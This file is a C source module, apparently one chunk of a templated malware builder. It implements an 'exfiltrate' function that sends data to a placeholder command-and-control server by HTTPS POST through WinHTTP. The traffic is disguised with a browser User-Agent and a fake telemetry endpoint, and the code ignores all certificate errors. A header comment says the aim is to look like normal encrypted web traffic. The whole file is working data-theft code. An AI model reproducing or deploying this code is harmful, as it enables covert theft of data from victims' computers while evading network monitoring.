// chunk: exfil/https_post
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, winhttp.h
// libs: ws2_32, winhttp
// note: HTTPS POST via WinHTTP — looks like normal encrypted web traffic

#ifndef CHUNK_HTTPS_POST
#define CHUNK_HTTPS_POST

#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>

#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | \
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID | \
    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE)
#endif

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    wchar_t wip[64];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConn = WinHttpConnect(hSession, wip, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return FALSE; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", L"/api/v1/telemetry",
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (!hReq) {
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Accept any cert for testing
    DWORD flags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    BOOL ok = WinHttpSendRequest(hReq, L"Content-Type: application/octet-stream\r\n",
                                 -1L, (LPVOID)data, len, len, 0);
    if (ok) ok = WinHttpReceiveResponse(hReq, NULL);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return ok;
}

#endif
